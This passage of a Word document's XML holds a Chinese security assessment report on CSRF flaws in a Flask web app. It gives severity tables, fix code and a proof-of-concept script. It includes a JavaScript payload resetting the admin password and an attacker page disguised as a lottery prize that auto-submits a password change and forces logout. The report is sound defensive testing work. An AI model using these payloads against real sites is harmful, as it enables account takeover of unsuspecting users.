        <w:t xml:space="preserve">      body: 'csrf_token=' + csrfToken +</w:t>
        <w:br/>
        <w:t xml:space="preserve">            '&amp;username=admin&amp;new_password=xss_pwned'</w:t>
        <w:br/>
        <w:t xml:space="preserve">    });</w:t>
        <w:br/>
        <w:t xml:space="preserve">  });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. 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攻击难度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修改密码 CSRF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❌ 未修复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登出 CSRF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🟡 中危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>❌ 未修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>极低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充值 CSRF（有保护）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🟡 中危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注册 CSRF（有保护）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🟡 中危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上传 CSRF（有保护）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🟡 中危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登录 CSRF（有保护）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🟡 中危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/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>CSRF Token 机制现存问题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Token 未绑定用户身份</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>同一 Session 的 Token 可被其他用户复用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Token 无过期时间</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Token 永久有效，增加了泄露后的攻击窗口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Token 未绑定 Referer</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>无法校验请求来源是否合法</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. 修复方案与代码变更</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.1 修复 1：为 /change-password 添加 CSRF 保护</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>变更 1：在 app.py 中为 /change-password 路由添加 @csrf_required 装饰器</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:color w:val="E53E3E"/>
        </w:rPr>
        <w:t>修复前：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>@app.route("/change-password", methods=["POST"])</w:t>
        <w:br/>
        <w:t>def change_password():          # ❌ 无 CSRF 保护</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:color w:val="276749"/>
        </w:rPr>
        <w:t>修复后：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>@app.route("/change-password", methods=["POST"])</w:t>
        <w:br/>
        <w:t>@csrf_required                  # ✅ 添加 CSRF 保护</w:t>
        <w:br/>
        <w:t>def change_password():</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>变更 2：在 profile.html 模板的修改密码表单中添加 `csrf_token` 隐藏字段</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:color w:val="E53E3E"/>
        </w:rPr>
        <w:t>修复前：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;form action="/change-password" method="post"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="username" value="{{ user.username }}"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;!-- ❌ 缺少 csrf_token 隐藏字段 --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:color w:val="276749"/>
        </w:rPr>
        <w:t>修复后：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;form action="/change-password" method="post"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="csrf_token" value="{{ csrf_token }}"&gt;  &lt;!-- ✅ 添加 --&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;input type="hidden" name="username" value="{{ user.username }}"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.2 修复 2：将 /logout 改为 POST 并要求 CSRF Token</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>登出操作应使用 POST 方法并校验 CSRF Token，避免被外部页面通过 &lt;img&gt; 标签触发。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>修复方案：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 方法 1：改为 POST + CSRF</w:t>
        <w:br/>
        <w:t>@app.route("/logout", methods=["POST"])</w:t>
        <w:br/>
        <w:t>@csrf_required</w:t>
        <w:br/>
        <w:t>def logout():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    session.clear()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return redirect("/")</w:t>
        <w:br/>
        <w:br/>
        <w:t># 方法 2：配合 SameSite=Strict Cookie</w:t>
        <w:br/>
        <w:t>app.config.update(</w:t>
        <w:br/>
        <w:t xml:space="preserve">    SESSION_COOKIE_SAMESITE="Strict",</w:t>
        <w:br/>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.3 修复 3：增强 CSRF Token 安全机制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增强措施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Token 绑定用户</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>生成 Token 时加入用户标识：csrf_token(user_id) = HMAC(secret, user_id)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Token 过期时间</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>为 Token 设置过期时间（建议 30 分钟），过期后需重新获取</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Referer 校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>在生产环境配置 Referer 校验，只允许从本站发起的 POST 请求</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SameSite Cookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>设置 SESSION_COOKIE_SAMESITE="Strict"，阻止跨站发送 Cookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>验证码</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>对敏感操作（改密、大额充值）增加验证码二次确认</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.4 修复 4：完整的 CSRF 保护装饰器（推荐实现）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import hmac</w:t>
        <w:br/>
        <w:t>import time</w:t>
        <w:br/>
        <w:br/>
        <w:t>def _generate_csrf_token() -&gt; str:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """生成绑定用户和时间的 CSRF Token"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    user_id = session.get("user_id", "anonymous")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    timestamp = str(int(time.time()))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    raw = f"{user_id}:{timestamp}"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    sig = hmac.new(</w:t>
        <w:br/>
        <w:t xml:space="preserve">        app.secret_key.encode(),</w:t>
        <w:br/>
        <w:t xml:space="preserve">        raw.encode(),</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "sha256"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ).hexdigest()[:16]</w:t>
        <w:br/>
        <w:t xml:space="preserve">    token = f"{user_id}:{timestamp}:{sig}"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    session["csrf_token"] = token</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return token</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>def _validate_csrf_token(token: str | None) -&gt; bool:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """校验 CSRF Token，包含用户绑定和过期时间"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not token:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return False</w:t>
        <w:br/>
        <w:t xml:space="preserve">    parts = token.split(":")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if len(parts) != 3:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return False</w:t>
        <w:br/>
        <w:t xml:space="preserve">    user_id, timestamp, sig = parts</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 验证签名</w:t>
        <w:br/>
        <w:t xml:space="preserve">    raw = f"{user_id}:{timestamp}"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    expected = hmac.new(</w:t>
        <w:br/>
        <w:t xml:space="preserve">        app.secret_key.encode(),</w:t>
        <w:br/>
        <w:t xml:space="preserve">        raw.encode(),</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "sha256"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ).hexdigest()[:16]</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not hmac.compare_digest(sig, expected):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return False</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 验证用户身份</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if user_id != session.get("user_id", "anonymous"):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return False</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 验证过期时间（30 分钟）</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if int(time.time()) - int(timestamp) &gt; 1800:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return False</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    return True</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>9. POC 测试脚本</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>以下 Python 脚本可用于验证修改密码 CSRF 漏洞和登出 CSRF 漏洞：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>#!/usr/bin/env python3</w:t>
        <w:br/>
        <w:t>"""</w:t>
        <w:br/>
        <w:t>CSRF 漏洞验证脚本</w:t>
        <w:br/>
        <w:t>使用: python3 poc_csrf.py</w:t>
        <w:br/>
        <w:t>"""</w:t>
        <w:br/>
        <w:t>import requests</w:t>
        <w:br/>
        <w:t>import re</w:t>
        <w:br/>
        <w:t>import socket</w:t>
        <w:br/>
        <w:t>import threading</w:t>
        <w:br/>
        <w:t>from http.server import HTTPServer, BaseHTTPRequestHandler</w:t>
        <w:br/>
        <w:br/>
        <w:t>BASE_URL = "http://192.168.234.129:5000"</w:t>
        <w:br/>
        <w:t>ATTACKER_SERVER = ("0.0.0.0", 8888)</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>class CSRFPage(BaseHTTPRequestHandler):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """模拟攻击者的恶意页面服务器"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    def do_GET(self):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        self.send_response(200)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        self.send_header("Content-Type", "text/html; charset=utf-8")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        self.end_headers()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        html = f"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;html&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;h1&gt;🎉 恭喜您获得抽奖机会！&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;!-- CSRF 攻击：自动提交修改密码 --&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;form id="csrf" action="{BASE_URL}/change-password" method="POST"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            &lt;input type="hidden" name="username" value="admin"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            &lt;input type="hidden" name="new_password" value="csrf_pwned"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;/form&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;!-- CSRF 攻击：自动登出 --&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;img src="{BASE_URL}/logout" style="display:none" /&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;script&gt;document.getElementById("csrf").submit();&lt;/script&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;/body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        &lt;/html&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        """</w:t>
        <w:br/>
        <w:t xml:space="preserve">        self.wfile.write(html.encode())</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>def start_attacker_server():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """启动攻击者服务器"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    server = HTTPServer(ATTACKER_SERVER, CSRFPage)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(f"[攻击者服务器] http://127.0.0.1:8888")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    threading.Thread(target=server.serve_forever, daemon=True).start()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return server</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>def test_change_password_csrf():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """测试修改密码 CSRF（模拟攻击）"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("[*] 测试 1: 修改密码 CSRF")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    session = requests.Session()</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 正常登录</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r = session.get(f"{BASE_URL}/login")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    csrf = re.search(r'value="([a-f0-9]{32})"', r.text)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    csrf_token = csrf.group(1) if csrf else ""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    session.post(f"{BASE_URL}/login", data={</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "csrf_token": csrf_token,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "username": "admin",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "password": "admin123"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    })</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 模拟 CSRF：不带 Token 修改密码</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r = session.post(f"{BASE_URL}/change-password", data={</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "username": "admin",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "new_password": "csrf_test"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }, allow_redirects=False)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    if r.status_code != 403:  # 如果未返回 403，说明无 CSRF 保护</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print("  [漏洞确认] 可无 CSRF Token 修改密码")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(f"  状态码: {r.status_code}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print("  [安全] 请求被 CSRF 保护拦截 (403)")</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>def test_logout_csrf():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """测试登出 CSRF"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("[*] 测试 2: 登出 CSRF")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    session = requests.Session()</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 登录</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r = session.get(f"{BASE_URL}/login")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    csrf = re.search(r'value="([a-f0-9]{32})"', r.text)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    session.post(f"{BASE_URL}/login", data={</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "csrf_token": csrf.group(1),</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "username": "admin",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "password": "admin123"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    })</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 检查是否登录</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r = session.get(f"{BASE_URL}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "请先登录" not in r.text:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print("  已登录状态 ✓")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 模拟 CSRF：通过 GET 请求登出</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r = session.get(f"{BASE_URL}/logout", allow_redirects=False)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 验证是否已登出</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r = session.get(f"{BASE_URL}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "请先登录" in r.text:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print("  [漏洞确认] 通过 GET 请求成功登出（Logout CSRF）")</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>if __name__ == "__main__":</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("=" * 50)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("CSRF 漏洞验证脚本")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("目标:", BASE_URL)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("=" * 50)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print()</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    test_change_password_csrf()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    test_logout_csrf()</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    print()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("测试完成！")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="999999"/>
        </w:rPr>
        <w:t>— 报告结束 —</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="999999"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>免责声明：本报告仅用于安全教学与测试。未经授权对他人系统进行 CSRF 攻击可能违反法律法规。请在获得授权的前提下进行安全测试。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